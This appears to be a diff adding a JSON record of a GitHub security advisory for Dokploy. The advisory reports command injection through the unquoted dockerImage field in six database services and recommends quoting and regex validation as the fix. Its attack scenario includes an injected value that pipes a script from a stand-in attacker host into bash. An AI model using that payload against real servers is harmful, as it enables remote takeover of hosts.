@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-6jrh-8qmg-jj3p",
+  "repo": {
+    "cve_id": "CVE-2026-72862",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "## Summary\n\nSix Dokploy database service deployment functions pass user-controlled `dockerImage` fields unquoted into `docker pull ${dockerImage}` shell commands on the remote-server code path. The local (non-remote) code path for each service uses the Docker Engine API via Dockerode and is safe.\n\n---\n\n## VULN-016 - Command Injection via dockerImage in 6 Database Services → HOST RCE\n\n**Files** (all `packages/server/src/services/`):\n- `mariadb.ts:148`\n- `mongo.ts:163`\n- `mysql.ts:146`\n- `postgres.ts:157`\n- `redis.ts:113`\n- `libsql.ts:143`\n\n**CWE**: CWE-78 | **CVSS**: 8.0 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\n\nEach service follows the same pattern:\n\n```typescript\n// mariadb.ts:145-152 (identical pattern in all 6)\nif (mariadb.serverId) {\n    await execAsyncRemote(\n        mariadb.serverId,\n        `docker pull ${mariadb.dockerImage}`,  // ← COMPLETELY UNQUOTED\n    );\n} else {\n    await pullImage(mariadb.dockerImage, onData);  // safe: Docker API via Dockerode\n}\n```\n\nSchema (example - mariadb):\n```typescript\ndockerImage: z.string().default(\"mariadb:6\")   // only default value, no format restriction\n```\n\nThe `dockerImage` field is user-settable via the respective update API endpoint (e.g., `mariadb.update`, `mongo.update`). The field is stored in the database and used during deployment.\n\n### Affected Services\n\n| Service | File | Line | Default Image |\n|---------|------|------|---------------|\n| MariaDB | `services/mariadb.ts` | 148 | `mariadb:6` |\n| MongoDB | `services/mongo.ts` | 163 | `mongo:6` |\n| MySQL   | `services/mysql.ts` | 146 | `mysql:8` |\n| PostgreSQL | `services/postgres.ts` | 157 | `postgres:16` |\n| Redis   | `services/redis.ts` | 113 | `redis:7` |\n| LibSQL  | `services/libsql.ts` | 143 | `ghcr.io/tursodatabase/libsql-server:latest` |\n\n### Attack Scenario\n\n1. Attacker updates a MariaDB service: `dockerImage = \"mariadb:latest; curl attacker.com/shell | bash\"`\n2. Value stored in DB\n3. Attacker triggers redeployment (restart/update action)\n4. Remote server executes: `docker pull mariadb:latest; curl attacker.com/shell | bash`\n5. `curl attacker.com/shell | bash` runs on remote server HOST\n\n**Condition**: Service must have a `serverId` set (remote deployment mode).\n\n---\n\n## Recommended Fix\n\n```typescript\nimport { quote } from \"shell-quote\";\n\n// In each service file, replace:\nawait execAsyncRemote(service.serverId, `docker pull ${service.dockerImage}`);\n\n// With:\nawait execAsyncRemote(service.serverId, `docker pull ${quote([service.dockerImage])}`);\n\n// Or validate Docker image reference format:\ndockerImage: z.string().regex(\n    /^[a-zA-Z0-9][a-zA-Z0-9._/:@-]*$/,\n    \"Invalid Docker image reference\"\n)\n```\n\nDocker image references contain only alphanumeric characters, `.`, `_`, `/`, `:`, `@`, and `-` - a simple regex blocks all shell injection.\n\n## Verification\n\nConfirmed via static analysis on Dokploy v0.29.8. The asymmetry between `execAsyncRemote` (shell-based) and `pullImage` (Docker API) confirms this is a real vulnerability, not a false positive.",
+    "ghsa_id": "GHSA-6jrh-8qmg-jj3p",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-6jrh-8qmg-jj3p",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-6jrh-8qmg-jj3p"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72862"
+      }
+    ],
+    "published_at": "2026-07-21T23:22:43Z",
+    "references": [],
+    "severity": "high",
+    "summary": "OS Command Injection via dockerImage field in 6 database service deployment functions → HOST RCE",
+    "updated_at": "2026-08-10T17:57:26Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": null,
+        "vulnerable_version_range": "<= 0.29.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
